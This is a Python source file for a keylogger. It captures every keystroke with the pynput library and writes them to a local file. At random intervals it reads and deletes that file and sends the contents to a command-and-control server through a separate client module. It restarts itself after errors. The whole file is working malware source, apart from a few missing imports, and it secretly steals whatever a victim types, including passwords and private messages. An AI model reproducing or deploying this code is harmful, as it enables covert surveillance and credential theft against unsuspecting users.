'''
keylogger.py
Kezia Sharnoff

Input all key and write to a file. Every once in a while, send & delete that 
file to the control and command server. 

Starting key input from:
https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
'''

from pynput import keyboard
import os
import random
import client

KEY_FILE = "keylogged.txt"

def writeToFile(key):
	'''
	Append the inputted key to a file, with a 1/50 chance do the following:
	- read the entire file
	- delete it
	- send it to the server
	'''
	if key == None:
		return

	# "a" Adds to end of file the new key or create new file if it didn't exist
	with open(KEY_FILE, "a") as file:
		file.write(" " + key)

	# On a chance, take the contents of the file, send to server 
	# and delete the original file! 
	if random.randint(1, 50) == 1:
		with open(KEY_FILE, "r") as file:
			content = file.read().strip()

		os.remove(KEY_FILE)

		client.sendMessage(content) 


def on_press(key):
	'''
	Function called when a key is pressed, it formats it nicely as 
	'a' or 'BACKSPACE' and then send it to the file to be written
	'''

	output = None
	try:
		output = format(key.char)
	except AttributeError:
		# format of key is "key.backspace" which I want to change to "BACKSPACE"
		s = format(key).partition("Key.")
		# partition creates a 3-tuple with before the target, the target, and after
		# https://www.w3schools.com/python/ref_string_partition.asp
		if len(s[2]) > 0:
			output = s[2].upper()
		
	writeToFile(output)

def main():
	with keyboard.Listener(on_press = on_press) as listener:
		listener.join()

if __name__ == "__main__":

	# If a failure happens, wait 2 seconds and try again
	while True:
		try:
			main()
		except KeyboardInterrupt:
			sys.exit(0)
		except Exception as e:
			time.sleep(2)
